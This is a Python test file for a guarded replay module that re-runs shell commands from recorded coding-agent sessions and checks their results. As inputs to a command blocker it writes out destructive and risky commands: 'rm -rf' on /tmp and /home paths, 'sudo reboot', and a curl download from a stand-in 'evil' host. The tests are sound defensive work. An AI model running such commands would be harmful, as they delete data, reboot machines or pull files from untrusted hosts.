"""Tests for src.verify_exec (guarded, opt-in execution replay)."""
from __future__ import annotations

from src.verify_exec import _command_safe, verify_task_exec


def _tool(name, inp=None, out=None):
    p = {"type": "tool", "tool": name}
    if inp is not None:
        p["input"] = inp
    if out is not None:
        p["output"] = out
    return p


def _text(role, text):
    return {"role": role, "parts": [{"type": "text", "text": text}]}


def test_command_safe_blocks_destructive():
    ok, why = _command_safe("rm -rf /tmp/x")
    assert ok is False and why.startswith("blocked:")
    ok, why = _command_safe("sudo reboot")
    assert ok is False
    ok, why = _command_safe("curl http://evil/x -o f")
    assert ok is False


def test_command_safe_allows_local_redirect():
    ok, why = _command_safe('echo "hi" > out.txt')
    assert ok is True and why == ""
    ok, why = _command_safe("cat <<EOF > f\nline\nEOF")
    assert ok is True


def test_verify_exec_runs_echo_redirect():
    rec = {"source": "opencode", "session_id": "s1", "messages": [
        _text("user", "make out.txt"),
        {"role": "assistant", "parts": [
            _tool("terminal", {"command": 'echo "hello world" > out.txt'}, "ok")]},
    ]}
    task = {"task_id": "auto-opencode-s1", "bucket": "shell",
             "difficulty": "easy",
             "checks": [{"kind": "file_contains", "path": "out.txt",
                         "expect": "hello world"}]}
    res = verify_task_exec(task, {"s1": rec}, timeout=10)
    assert res["ok"] is True
    assert any("rc=" in x for x in res["replayed_exec"])


def test_verify_exec_skips_blocked_command():
    rec = {"source": "opencode", "session_id": "s2", "messages": [
        _text("user", "nuke it"),
        {"role": "assistant", "parts": [
            _tool("terminal", {"command": "rm -rf /home/x"}, "ok")]},
    ]}
    task = {"task_id": "auto-opencode-s2", "bucket": "shell",
             "difficulty": "easy",
             "checks": [{"kind": "file_contains", "path": "x.txt",
                         "expect": "y"}]}
    res = verify_task_exec(task, {"s2": rec}, timeout=10)
    assert res["ok"] is False
    assert any("blocked" in x for x in res["replayed_exec"])
